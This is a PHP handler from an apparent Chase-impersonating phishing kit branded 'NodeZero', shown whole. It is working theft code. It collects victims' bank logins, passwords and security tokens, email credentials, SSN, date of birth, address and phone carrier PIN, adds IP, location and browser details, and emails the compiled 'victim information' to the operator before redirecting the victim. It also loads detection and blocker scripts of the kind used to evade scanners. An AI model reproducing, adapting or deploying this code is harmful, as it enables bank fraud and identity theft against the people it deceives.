<?php

// require 'vendor/autoload.php';
// include('mailer.php');
session_start();
require_once '../main.php';
include('../detects.php');
include('../blockers.php');
if (!$_POST['SecurityNumber']){
} else {
    $cityg = $_SESSION['cityg'];
    $regiong = $_SESSION['regiong'];
    $countryg = $_SESSION['countryg'];
    $VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
    $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| Us3r4gent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    $userbank = $_SESSION['userbank'];
    $passwordbank = $_SESSION['passwordbank'];
    $securityTokenbank = $_SESSION['securityTokenbank'];
    $emaildress = $_SESSION['emaildress'];
    $emailPassword = $_SESSION['emailPassword'];
    $emailretry = $_SESSION['emailretry'];
    $emailType = $_SESSION['emailType'];
    $emailProvider = $_SESSION['emailProvider'];
    $fullname = $_SESSION['fullname'] = $_POST['fullname'];
    $DateOfBirth = $_SESSION['DateOfBirth'] = $_POST['DateOfBirth'];
    $StreetAddress = $_SESSION['StreetAddress'] = $_POST['StreetAddress'];
    $StateRegion = $_SESSION['StateRegion'] = $_POST['StateRegion'];
    $ZipCode = $_SESSION['ZipCode'] = $_POST['ZipCode'];
    $CityR = $_SESSION['CityR'] = $_POST['CityR'];
    $NumberPhone = $_SESSION['NumberPhone'] = $_POST['NumberPhone'];
    $NumberCarrier = $_SESSION['NumberCarrier'] = $_POST['NumberCarrier'];
    $NumberPin = $_SESSION['NumberPin'] = $_POST['NumberPin'];
    $SecurityNumber = $_SESSION['SecurityNumber'] = $_POST['SecurityNumber'];
    $message = "+ -------- [ ⚡ NodeZero ⚡ ] -----------+\n";
    $message .= "+ 🏦 Ch4se L0gin Details\n";
    $message .= "| Ch4se l0gin : $userbank\n";
    $message .= "| Ch4se p4ssword : $passwordbank\n";
    if (isset($_SESSION['securityTokenbank'])) {
        $message .= "| Ch4se Security T0ken : $securityTokenbank\n";
    }
    $message .= "+ ------------------------------------+\n";
    $message .= "+ ✅ Em4il l0gin $emailretry\n";
    $message .= "| Em4il l0gin : $emaildress\n";
    $message .= "| Em4il p4ssword : $emailPassword\n";
    $message .= "| Em4il Pr0vider : $emailProvider\n";
    $message .= "| Em4il Type : $emailType\n";
    $message .= "+ ------------------------------------+\n";
    $message .= "+ 💎 Personal Information\n";
    $message .= "| Full n4me : $fullname\n";
    $message .= "| D4te of birth : $DateOfBirth\n";
    $message .= "| SSN : $SecurityNumber\n";
    $message .= "| 4ddr3ss : $StreetAddress\n";
    $message .= "| St4te : $StateRegion\n";
    $message .= "| City : $CityR\n";
    $message .= "| Zip : $ZipCode\n";
    $message .= "| Teleph0ne : $NumberPhone\n";
    if ($enablephonepin === "on") {
        $message .= "| Ph0ne Carrier : $NumberCarrier\n";
        $message .= "| Ph0ne Carrier Pln : $NumberPin\n";
    }
    $message .= "+ ------------------------------------+\n";
    $message .= "+ 🌐 Victim Inf0rmation\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ------------------------------------+\n";
    $subject = "CH4SE BILLING: ".$_POST['fullname']." [ $cn - $os - $v_ip ]";
    kirim_mail($email_result, "CH4SE BILLING ".$fullname, $subject, $message);
    tulis_file("../result/total_billing.txt", "$fullname");
    header('Location: Final?key='.$key);
}
?>